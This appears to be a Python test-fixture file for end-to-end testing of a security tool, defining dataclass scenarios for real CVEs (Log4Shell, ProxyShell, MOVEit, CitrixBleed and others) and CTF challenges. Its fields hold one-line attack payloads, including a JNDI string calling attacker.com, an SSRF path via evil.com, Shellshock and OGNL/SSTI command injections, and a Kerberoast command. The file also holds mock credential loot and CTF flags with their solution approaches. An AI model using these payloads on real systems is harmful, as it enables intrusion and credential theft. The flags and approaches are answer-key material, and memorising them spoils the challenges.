"""Real CVE scenarios for E2E testing.

Each scenario represents a complete attack chain from reconnaissance
through exploitation, using real-world CVE data.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any


@dataclass(frozen=True)
class CVEScenario:
    """A real-world CVE scenario for testing."""
    name: str
    cve_id: str
    cvss: float
    target_software: str
    target_version: str
    vuln_type: str
    cwe_id: str
    description: str
    affected_ports: tuple[int, ...]
    attack_vector: str
    exploit_technique: str
    expected_access: str
    evidence_pattern: str
    mitre_technique: str


# ═══════════════════════════════════════════════════════════════════
#  1-Day CVE Scenarios
# ═══════════════════════════════════════════════════════════════════

LOG4SHELL = CVEScenario(
    name="Log4Shell",
    cve_id="CVE-2021-44228",
    cvss=10.0,
    target_software="Apache Log4j",
    target_version="2.14.1",
    vuln_type="Remote Code Execution",
    cwe_id="CWE-917",
    description=(
        "Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases) "
        "JNDI features do not protect against attacker controlled LDAP and other "
        "JNDI related endpoints. An attacker who can control log messages or log "
        "message parameters can execute arbitrary code loaded from LDAP servers."
    ),
    affected_ports=(8080, 8443, 9200),
    attack_vector="${jndi:ldap://attacker.com/exploit}",
    exploit_technique="JNDI injection via HTTP header",
    expected_access="user",
    evidence_pattern="uid=\\d+\\(\\w+\\)",
    mitre_technique="T1190",  # Exploit Public-Facing Application
)

SPRING4SHELL = CVEScenario(
    name="Spring4Shell",
    cve_id="CVE-2022-22965",
    cvss=9.8,
    target_software="Spring Framework",
    target_version="5.3.17",
    vuln_type="Remote Code Execution",
    cwe_id="CWE-94",
    description=(
        "A Spring MVC or Spring WebFlux application running on JDK 9+ may be "
        "vulnerable to remote code execution (RCE) via data binding."
    ),
    affected_ports=(8080, 8443),
    attack_vector="class.module.classLoader.resources manipulation",
    exploit_technique="ClassLoader manipulation via data binding",
    expected_access="user",
    evidence_pattern="uid=\\d+\\(tomcat\\)",
    mitre_technique="T1190",
)

ETERNAL_BLUE = CVEScenario(
    name="EternalBlue",
    cve_id="CVE-2017-0144",
    cvss=9.3,
    target_software="Microsoft Windows SMBv1",
    target_version="Windows 7 / Server 2008 R2",
    vuln_type="Remote Code Execution",
    cwe_id="CWE-120",
    description=(
        "The SMBv1 server in Microsoft Windows allows remote attackers to "
        "execute arbitrary code via crafted packets."
    ),
    affected_ports=(445, 139),
    attack_vector="Crafted SMBv1 transaction request",
    exploit_technique="Buffer overflow in SMBv1 protocol handling",
    expected_access="system",
    evidence_pattern="NT AUTHORITY\\\\SYSTEM",
    mitre_technique="T1210",  # Exploitation of Remote Services
)

SHELLSHOCK = CVEScenario(
    name="Shellshock",
    cve_id="CVE-2014-6271",
    cvss=10.0,
    target_software="GNU Bash",
    target_version="4.3",
    vuln_type="Remote Code Execution",
    cwe_id="CWE-78",
    description=(
        "GNU Bash through 4.3 processes trailing strings after function "
        "definitions in the values of environment variables, which allows "
        "remote attackers to execute arbitrary code via a crafted environment."
    ),
    affected_ports=(80, 443, 8080),
    attack_vector="() { :; }; /bin/cat /etc/passwd",
    exploit_technique="Environment variable injection via CGI",
    expected_access="user",
    evidence_pattern="root:x:0:0:",
    mitre_technique="T1059.004",  # Unix Shell
)

PWNKIT = CVEScenario(
    name="PwnKit",
    cve_id="CVE-2021-4034",
    cvss=7.8,
    target_software="PolicyKit (pkexec)",
    target_version="0.105-31",
    vuln_type="Local Privilege Escalation",
    cwe_id="CWE-787",
    description=(
        "A local privilege escalation vulnerability in polkit's pkexec utility. "
        "The vulnerability enables an unprivileged local user to gain root access."
    ),
    affected_ports=(),
    attack_vector="pkexec --help (with crafted argc)",
    exploit_technique="Out-of-bounds write in pkexec argv handling",
    expected_access="root",
    evidence_pattern="uid=0\\(root\\)",
    mitre_technique="T1068",  # Exploitation for Privilege Escalation
)


ALL_CVE_SCENARIOS = [LOG4SHELL, SPRING4SHELL, ETERNAL_BLUE, SHELLSHOCK, PWNKIT]


# ═══════════════════════════════════════════════════════════════════
#  Advanced CVE Scenarios (multi-stage, high difficulty)
# ═══════════════════════════════════════════════════════════════════


@dataclass(frozen=True)
class AdvancedCVEScenario:
    """Multi-stage CVE exploitation scenario."""
    name: str
    stages: tuple[CVEScenario, ...]
    lateral_targets: tuple[str, ...] = ()
    final_access: str = "root"
    description: str = ""
    loot: tuple[dict[str, str], ...] = ()


PROXYSHELL = AdvancedCVEScenario(
    name="ProxyShell Chain",
    description=(
        "Microsoft Exchange Server ProxyShell chain: CVE-2021-34473 (SSRF) "
        "→ CVE-2021-34523 (Elevation) → CVE-2021-31207 (RCE via webshell)"
    ),
    stages=(
        CVEScenario(
            name="ProxyShell SSRF",
            cve_id="CVE-2021-34473",
            cvss=9.1,
            target_software="Microsoft Exchange",
            target_version="2019 CU9",
            vuln_type="Server-Side Request Forgery",
            cwe_id="CWE-918",
            description="Pre-auth SSRF via /autodiscover endpoint bypasses ACL",
            affected_ports=(443,),
            attack_vector="GET /autodiscover/autodiscover.json?@evil.com/mapi/nspi/ HTTP/1.1",
            exploit_technique="SSRF to backend services via path confusion",
            expected_access="backend_access",
            evidence_pattern="X-CalculatedBETarget: exchange-backend",
            mitre_technique="T1190",
        ),
        CVEScenario(
            name="ProxyShell Elevation",
            cve_id="CVE-2021-34523",
            cvss=9.8,
            target_software="Microsoft Exchange",
            target_version="2019 CU9",
            vuln_type="Privilege Escalation",
            cwe_id="CWE-287",
            description="Exchange PowerShell remoting elevation via backend SID injection",
            affected_ports=(443,),
            attack_vector="X-Rps-CAT: sid=S-1-5-21-...(admin SID)",
            exploit_technique="SID injection in Exchange PowerShell backend",
            expected_access="exchange_admin",
            evidence_pattern="Mailbox: administrator@",
            mitre_technique="T1068",
        ),
        CVEScenario(
            name="ProxyShell Webshell",
            cve_id="CVE-2021-31207",
            cvss=6.6,
            target_software="Microsoft Exchange",
            target_version="2019 CU9",
            vuln_type="Remote Code Execution",
            cwe_id="CWE-22",
            description="Arbitrary file write via Exchange admin PowerShell cmdlets",
            affected_ports=(443,),
            attack_vector="New-MailboxExportRequest -FilePath \\\\\\\\...\\\\webshell.aspx",
            exploit_technique="Webshell drop via mailbox export to webroot",
            expected_access="system",
            evidence_pattern="nt authority\\\\system",
            mitre_technique="T1505.003",
        ),
    ),
    lateral_targets=("dc01.corp.local", "sql01.corp.local"),
    final_access="system",
    loot=(
        {"type": "credential", "desc": "NTLM hash: Administrator:500:aad3b...:31d6c..."},
        {"type": "credential", "desc": "krbtgt hash for Golden Ticket"},
        {"type": "data", "desc": "Global Address List (2,847 entries)"},
    ),
)

DIRTY_PIPE = AdvancedCVEScenario(
    name="Log4Shell → Dirty Pipe Chain",
    description=(
        "Initial access via Log4Shell (CVE-2021-44228) on web app, "
        "then local privilege escalation via Dirty Pipe (CVE-2022-0847)"
    ),
    stages=(
        CVEScenario(
            name="Log4Shell Initial Access",
            cve_id="CVE-2021-44228",
            cvss=10.0,
            target_software="Apache Log4j",
            target_version="2.14.1",
            vuln_type="Remote Code Execution",
            cwe_id="CWE-917",
            description="JNDI injection in Log4j for initial foothold",
            affected_ports=(8080, 9200),
            attack_vector="${jndi:ldap://attacker.com/a}",
            exploit_technique="JNDI injection via User-Agent header",
            expected_access="user",
            evidence_pattern="uid=1000\\(app\\)",
            mitre_technique="T1190",
        ),
        CVEScenario(
            name="Dirty Pipe LPE",
            cve_id="CVE-2022-0847",
            cvss=7.8,
            target_software="Linux Kernel",
            target_version="5.8-5.16.10",
            vuln_type="Local Privilege Escalation",
            cwe_id="CWE-281",
            description="Overwrite read-only files by splicing into pipes",
            affected_ports=(),
            attack_vector="splice() pipe page cache poisoning on /etc/passwd",
            exploit_technique="Pipe buffer page cache overwrite",
            expected_access="root",
            evidence_pattern="uid=0\\(root\\)",
            mitre_technique="T1068",
        ),
    ),
    final_access="root",
    loot=(
        {"type": "credential", "desc": "root:$y$...(shadow hash)"},
        {"type": "key", "desc": "/root/.ssh/id_rsa (RSA private key)"},
    ),
)

MOVEIT_CHAIN = AdvancedCVEScenario(
    name="MOVEit SQLi-to-RCE",
    description=(
        "MOVEit Transfer CVE-2023-34362: SQL injection in authentication bypass "
        "→ deserialization RCE → data exfiltration (cl0p ransomware technique)"
    ),
    stages=(
        CVEScenario(
            name="MOVEit SQLi",
            cve_id="CVE-2023-34362",
            cvss=9.8,
            target_software="Progress MOVEit Transfer",
            target_version="2023.0.1",
            vuln_type="SQL Injection",
            cwe_id="CWE-89",
            description="SQLi in MOVEit Transfer allows authentication bypass and DB access",
            affected_ports=(443,),
            attack_vector="POST /moveitisapi/moveitisapi.dll?action=m2 (crafted SQLi in headers)",
            exploit_technique="SQL injection to create sysadmin user + insert webshell",
            expected_access="db_admin",
            evidence_pattern="sysadmin_added=true",
            mitre_technique="T1190",
        ),
        CVEScenario(
            name="MOVEit Deserialization RCE",
            cve_id="CVE-2023-34362",
            cvss=9.8,
            target_software="Progress MOVEit Transfer",
            target_version="2023.0.1",
            vuln_type="Deserialization RCE",
            cwe_id="CWE-502",
            description="Webshell via deserialization gadget chain in MOVEit .NET framework",
            affected_ports=(443,),
            attack_vector="human2.aspx webshell with Azure AD token impersonation",
            exploit_technique="Deserialization to webshell, data exfil via GatorService",
            expected_access="system",
            evidence_pattern="nt authority\\\\system",
            mitre_technique="T1059.001",
        ),
    ),
    final_access="system",
    loot=(
        {"type": "data", "desc": "MOVEit DB dump: 14,000 file transfer records"},
        {"type": "credential", "desc": "Azure AD Service Principal credentials"},
    ),
)

CITRIX_BLEED = AdvancedCVEScenario(
    name="CitrixBleed → Lateral Movement",
    description=(
        "Citrix NetScaler session token leak (CVE-2023-4966) "
        "→ session hijacking → internal network pivot → DC compromise"
    ),
    stages=(
        CVEScenario(
            name="CitrixBleed",
            cve_id="CVE-2023-4966",
            cvss=9.4,
            target_software="Citrix NetScaler ADC",
            target_version="13.1-49.15",
            vuln_type="Information Disclosure",
            cwe_id="CWE-119",
            description="Buffer over-read leaks session tokens from NetScaler memory",
            affected_ports=(443,),
            attack_vector="GET /oauth/idp/.well-known/openid-configuration (oversized Host header)",
            exploit_technique="Buffer over-read to extract session cookies",
            expected_access="vpn_session",
            evidence_pattern="NSC_AAAC=.*[a-f0-9]{32}",
            mitre_technique="T1557",
        ),
        CVEScenario(
            name="Kerberoast via VPN",
            cve_id="CVE-2023-4966",
            cvss=9.4,
            target_software="Active Directory",
            target_version="Windows Server 2019",
            vuln_type="Credential Theft",
            cwe_id="CWE-522",
            description="Kerberoasting SPNs via hijacked VPN session, crack service tickets offline",
            affected_ports=(88, 389, 636),
            attack_vector="GetUserSPNs.py -request -dc-ip 10.10.0.1",
            exploit_technique="Kerberoast → offline TGS-REP cracking → DA credentials",
            expected_access="domain_admin",
            evidence_pattern="Administrator@CORP.LOCAL",
            mitre_technique="T1558.003",
        ),
    ),
    lateral_targets=("dc01.corp.local", "fileserver.corp.local", "sql01.corp.local"),
    final_access="domain_admin",
    loot=(
        {"type": "credential", "desc": "Domain Admin: Administrator@CORP.LOCAL"},
        {"type": "credential", "desc": "NTDS.dit hash dump (8,432 accounts)"},
        {"type": "data", "desc": "GPP passwords from SYSVOL"},
    ),
)

CONFLUENCE_RCE = AdvancedCVEScenario(
    name="Confluence RCE → Container Escape",
    description=(
        "Confluence OGNL injection (CVE-2022-26134) → container RCE "
        "→ container escape via CVE-2022-0185 → host root"
    ),
    stages=(
        CVEScenario(
            name="Confluence OGNL Injection",
            cve_id="CVE-2022-26134",
            cvss=9.8,
            target_software="Atlassian Confluence",
            target_version="7.18.0",
            vuln_type="Remote Code Execution",
            cwe_id="CWE-917",
            description="OGNL injection via URI in Confluence allows unauthenticated RCE",
            affected_ports=(8090, 8091),
            attack_vector="GET /%24%7B(#a=@..Runtime@getRuntime().exec('id'))%7D/ HTTP/1.1",
            exploit_technique="OGNL expression injection in URI path",
            expected_access="confluence_user",
            evidence_pattern="uid=2002\\(confluence\\)",
            mitre_technique="T1190",
        ),
        CVEScenario(
            name="Container Escape via fsconfig",
            cve_id="CVE-2022-0185",
            cvss=8.4,
            target_software="Linux Kernel (container)",
            target_version="5.13-5.16.2",
            vuln_type="Container Escape",
            cwe_id="CWE-190",
            description="Heap overflow in legacy_parse_param allows container escape via user namespaces",
            affected_ports=(),
            attack_vector="unshare + heap spray via legacy filesystem context",
            exploit_technique="Heap overflow in fsconfig → overwrite cred struct → ns escape",
            expected_access="root",
            evidence_pattern="uid=0\\(root\\) on host",
            mitre_technique="T1611",
        ),
    ),
    final_access="root",
    loot=(
        {"type": "credential", "desc": "Confluence DB: admin:$2a$10$...(bcrypt)"},
        {"type": "key", "desc": "Kubernetes service account token"},
        {"type": "data", "desc": "Host /etc/shadow with 42 accounts"},
    ),
)


ALL_ADVANCED_CVE_SCENARIOS = [PROXYSHELL, DIRTY_PIPE, MOVEIT_CHAIN, CITRIX_BLEED, CONFLUENCE_RCE]


# ═══════════════════════════════════════════════════════════════════
#  CTF Challenge Scenarios
# ═══════════════════════════════════════════════════════════════════


@dataclass(frozen=True)
class CTFScenario:
    """A CTF challenge scenario for testing."""
    name: str
    category: str
    points: int
    description: str
    flag: str
    approach: str
    techniques: tuple[str, ...]


BABY_SQLI = CTFScenario(
    name="Baby SQLi",
    category="web",
    points=100,
    description=(
        "A simple login form with SQL injection vulnerability. "
        "Find the admin password and get the flag."
    ),
    flag="flag{un10n_1nj3ct10n_b4by}",
    approach="Union-based SQL injection with information_schema enumeration",
    techniques=("UNION SELECT", "information_schema.tables", "information_schema.columns"),
)

XSS_PLAYGROUND = CTFScenario(
    name="XSS Playground",
    category="web",
    points=200,
    description="Bypass CSP and WAF to execute XSS and steal the admin cookie.",
    flag="flag{d0m_purify_byp4ss}",
    approach="DOM clobbering to bypass DOMPurify, then steal cookie via fetch",
    techniques=("DOM clobbering", "CSP bypass", "cookie exfiltration"),
)

BABY_PWN = CTFScenario(
    name="Baby Overflow",
    category="pwn",
    points=150,
    description="Classic buffer overflow with NX disabled. Overwrite return address to shellcode.",
    flag="flag{r3t2sh3llc0d3}",
    approach="Stack buffer overflow → NOP sled → shellcode",
    techniques=("buffer overflow", "NOP sled", "shellcode", "gdb"),
)

RSA_BABY = CTFScenario(
    name="RSA Baby",
    category="crypto",
    points=100,
    description="RSA with small public exponent e=3 and no padding. Recover plaintext.",
    flag="flag{sm4ll_e_n0_p4dd1ng}",
    approach="Cube root attack (e=3, m^3 < n, so m = ∛(c))",
    techniques=("cube root", "small exponent attack", "integer nth root"),
)

REVERSEME = CTFScenario(
    name="ReverseMe",
    category="reverse",
    points=200,
    description="Stripped ELF binary. Find the correct input that produces 'Correct!'.",
    flag="flag{str1ngs_4nd_gh1dr4}",
    approach="Static analysis with Ghidra + dynamic analysis with GDB",
    techniques=("Ghidra decompilation", "GDB breakpoints", "string analysis"),
)

STEGO_PNG = CTFScenario(
    name="Hidden Message",
    category="misc",
    points=100,
    description="A PNG image with a hidden message. Find the flag.",
    flag="flag{lsb_st3g0_3z}",
    approach="LSB steganography extraction from PNG",
    techniques=("zsteg", "LSB extraction", "binwalk"),
)


ALL_CTF_SCENARIOS = [BABY_SQLI, XSS_PLAYGROUND, BABY_PWN, RSA_BABY, REVERSEME, STEGO_PNG]


# ═══════════════════════════════════════════════════════════════════
#  Advanced CTF Challenge Scenarios (multi-step, high difficulty)
# ═══════════════════════════════════════════════════════════════════


@dataclass(frozen=True)
class AdvancedCTFScenario:
    """Multi-step CTF challenge requiring chained techniques."""
    name: str
    category: str
    points: int
    description: str
    flag: str
    steps: tuple[dict[str, str], ...]  # ordered steps with technique + result
    final_approach: str


HEAP_TCACHE = AdvancedCTFScenario(
    name="Heap Maze",
    category="pwn",
    points=500,
    description=(
        "Hardened heap challenge: tcache poisoning → fastbin dup → overwrite __free_hook. "
        "Full RELRO, PIE, stack canary. Requires heap leak + libc leak chained together."
    ),
    flag="flag{tc4ch3_p01s0n_4nd_fr33_h00k}",
    steps=(
        {"technique": "heap_leak", "result": "Leaked heap base: 0x55555576b000 via unsorted bin fd pointer"},
        {"technique": "libc_leak", "result": "Leaked libc base: 0x7ffff7dc2000 via large bin remainder"},
        {"technique": "tcache_poison", "result": "Corrupted tcache 0x90 freelist → points to __free_hook"},
        {"technique": "overwrite_hook", "result": "Wrote system() address to __free_hook, triggered /bin/sh"},
    ),
    final_approach="UAF to leak heap/libc → tcache poisoning → __free_hook overwrite → system('/bin/sh')",
)

BLIND_XXE = AdvancedCTFScenario(
    name="XML Fortress",
    category="web",
    points=400,
    description=(
        "Blind XXE with WAF bypass. No direct output, must exfiltrate via OOB. "
        "WAF blocks common XXE patterns — requires parameter entity + UTF-16 encoding bypass."
    ),
    flag="flag{00b_xxe_utf16_byp4ss}",
    steps=(
        {"technique": "waf_recon", "result": "WAF blocks <!ENTITY, SYSTEM, file://. UTF-8 blocked."},
        {"technique": "encoding_bypass", "result": "UTF-16BE encoded payload bypasses WAF pattern match"},
        {"technique": "oob_exfil", "result": "Parameter entity → external DTD → HTTP callback with file data"},
        {"technique": "flag_extract", "result": "Exfiltrated /flag.txt via OOB DNS + HTTP channel"},
    ),
    final_approach="UTF-16BE encoding bypass → parameter entity → external DTD → OOB HTTP exfiltration",
)

ECC_INVALID_CURVE = AdvancedCTFScenario(
    name="Curve Breaker",
    category="crypto",
    points=500,
    description=(
        "ECDH key exchange with invalid curve attack. Server doesn't validate "
        "that received points are on the curve. Recover private key via small subgroup "
        "confinement using CRT."
    ),
    flag="flag{1nv4l1d_curv3_crt_4tt4ck}",
    steps=(
        {"technique": "curve_recon", "result": "Server uses P-256, no point validation on received Q"},
        {"technique": "subgroup_search", "result": "Found 12 curves with small-order subgroups (orders: 3,5,7,11,13,17,19,23,29,31,37,41)"},
        {"technique": "oracle_queries", "result": "Sent invalid-curve points, collected shared secrets for each subgroup"},
        {"technique": "crt_recovery", "result": "CRT on residues mod (3*5*7*11*13*17*19*23*29*31*37*41) recovered private key d"},
    ),
    final_approach="Invalid curve point injection → small subgroup oracle → CRT private key recovery",
)

KERNEL_ROP = AdvancedCTFScenario(
    name="Ring Zero",
    category="pwn",
    points=600,
    description=(
        "Kernel exploitation via vulnerable ioctl handler. SMEP+SMAP+KASLR enabled. "
        "Must bypass all mitigations: leak KASLR base via /proc, build kernel ROP chain, "
        "commit_creds(prepare_kernel_cred(0)) → return to userland."
    ),
    flag="flag{k3rn3l_r0p_sm3p_byp4ss}",
    steps=(
        {"technique": "kaslr_leak", "result": "Leaked kernel base 0xffffffff81000000 via /proc/kallsyms side-channel"},
        {"technique": "stack_pivot", "result": "Triggered stack pivot via ioctl UAF → controlled kernel RSP"},
        {"technique": "rop_chain", "result": "Built ROP: pop rdi; ret → 0 → prepare_kernel_cred → commit_creds"},
        {"technique": "return_userland", "result": "KPTI trampoline: swapgs → iretq → userland with uid=0"},
    ),
    final_approach="KASLR leak → ioctl UAF → stack pivot → kernel ROP (commit_creds) → KPTI return",
)

WEB_CHAIN = AdvancedCTFScenario(
    name="Web Labyrinth",
    category="web",
    points=500,
    description=(
        "Multi-stage web challenge: SSRF via PDF generation → internal service discovery "
        "→ SSTI in internal Flask app → RCE → read flag from root-only file"
    ),
    flag="flag{ssrf_sst1_rc3_ch41n}",
    steps=(
        {"technique": "ssrf_via_pdf", "result": "PDF generator fetches internal URLs via <link> tag injection"},
        {"technique": "internal_recon", "result": "Discovered internal Flask debug panel at http://10.0.0.2:5000/debug"},
        {"technique": "ssti_exploit", "result": "SSTI via {{config.__class__.__init__.__globals__['os'].popen('id')}}"},
        {"technique": "privesc_suid", "result": "Found SUID binary, exploited to read /root/flag.txt"},
    ),
    final_approach="PDF SSRF → internal Flask discovery → SSTI to RCE → SUID privesc → flag",
)


ALL_ADVANCED_CTF_SCENARIOS = [HEAP_TCACHE, BLIND_XXE, ECC_INVALID_CURVE, KERNEL_ROP, WEB_CHAIN]
